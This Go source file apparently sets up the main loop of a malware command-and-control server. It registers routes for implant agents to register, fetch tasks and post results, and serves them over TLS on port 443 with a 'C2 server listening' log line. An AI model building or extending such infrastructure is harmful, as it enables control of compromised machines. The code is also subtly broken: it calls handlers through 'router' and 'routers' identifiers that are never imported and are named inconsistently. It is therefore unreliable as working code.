package main

import (
	"crypto/tls"
	"log"
	"net/http"

	"github.com/gorilla/mux"
)

// --------------------
// Main Server Logic
// --------------------

func main() {
	r := mux.NewRouter()

	r.HandleFunc("/register", router.registerAgentHandler).Methods("POST")

	r.HandleFunc("/tasks/{agentID}", routers.getTasksHandler).Methods("GET")
	r.HandleFunc("/tasks", router.postTaskHandler).Methods("POST")

	r.HandleFunc("/results", router.postResultHandler).Methods("POST")
	//r.HandleFunc("/results", getResultHandler).Methods("GET")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	log.Println("[*] C2 server listening on https://localhost:443")
	err := server.ListenAndServeTLS("server.crt", "server.key")
	if err != nil {
		log.Fatal(err)
	}
}
